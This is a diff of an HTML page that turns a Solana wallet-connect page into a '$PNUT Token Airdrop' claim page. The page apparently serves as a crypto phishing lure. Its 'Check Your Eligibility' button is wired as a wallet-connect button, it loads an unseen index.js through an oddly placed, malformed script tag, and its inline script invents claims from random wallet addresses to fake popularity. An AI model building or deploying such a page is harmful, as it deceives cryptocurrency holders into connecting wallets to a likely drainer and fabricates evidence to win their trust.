@@ -1,27 +1,113 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"><script src="./index.js"></script
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Solana Wallet Connect</title>
-  <!-- Link to the CSS file -->
-  <link rel="stylesheet" href="style.css">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"><script src="./index.js"></scrip
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>$PNUT Airdrop</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: url('https://via.placeholder.com/1920x1080') no-repeat center center fixed;
+            background-size: cover;
+            color: #fff;
+            text-align: center;
+        }
+        .container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 10px;
+            width: 80%;
+            max-width: 600px;
+        }
+        h1 {
+            font-size: 36px;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        p {
+            font-size: 18px;
+            margin-bottom: 30px;
+        }
+        .btn {
+            background-color: #1c5e3a;
+            color: #fff;
+            padding: 15px 25px;
+            font-size: 18px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .btn:hover {
+            background-color: #2a763e;
+        }
+        .notification {
+            margin-top: 30px;
+            font-size: 16px;
+            font-weight: bold;
+            color: #ffb84d;
+        }
+        .wallet {
+            font-style: italic;
+            color: #fff;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Connect Your Solana Wallet</h1>
-   <button class="connect-wallet">Open Modal</button>
-    <p id="message"></p>
-  </div>
 
-  <!-- Include @solana/web3.js using CDN -->
-  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.67.1/lib/index.iife.js"></script>
+<div class="container">
+    <h1>$PNUT Token Airdrop</h1>
+    <p>Welcome to the $PNUT Airdrop! Check your eligibility and claim your $PNUT Tokens. </p>
+    <button class="connect-wallet">Check Your Eligibility</button>
+    
+    <div id="notification" class="notification"></div>
+</div>
 
-  <!-- Include WalletConnect JavaScript for integration -->
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/client/dist/umd/index.min.js"></script>
+<script>
+    // Simulate random wallet claims
+    function getRandomWallet() {
+        const letters = '0123456789ABCDEF';
+        let wallet = '0x';
+        for (let i = 0; i < 40; i++) {
+            wallet += letters[Math.floor(Math.random() * 16)];
+        }
+        return wallet;
+    }
 
-  <!-- Link to the JavaScript file -->
-  <script src="index.js"></script>
+    function getRandomClaim() {
+        return Math.floor(Math.random() * 100) + 1; // Random claim between 1 and 100 $PNUT tokens
+    }
+
+    function checkEligibility() {
+        const wallet = getRandomWallet();
+        const claimAmount = getRandomClaim();
+
+        const notification = document.getElementById('notification');
+        notification.innerHTML = `Wallet <span class="wallet">${wallet}</span> has claimed ${claimAmount} $PNUT tokens!`;
+
+        // Simulate multiple random claims with a slight delay
+        setTimeout(function() {
+            const wallet2 = getRandomWallet();
+            const claimAmount2 = getRandomClaim();
+            notification.innerHTML += `<br>Wallet <span class="wallet">${wallet2}</span> has claimed ${claimAmount2} $PNUT tokens!`;
+        }, 2000);
+
+        setTimeout(function() {
+            const wallet3 = getRandomWallet();
+            const claimAmount3 = getRandomClaim();
+            notification.innerHTML += `<br>Wallet <span class="wallet">${wallet3}</span> has claimed ${claimAmount3} $PNUT tokens!`;
+        }, 4000);
+    }
+</script>
+
 </body>
 </html>
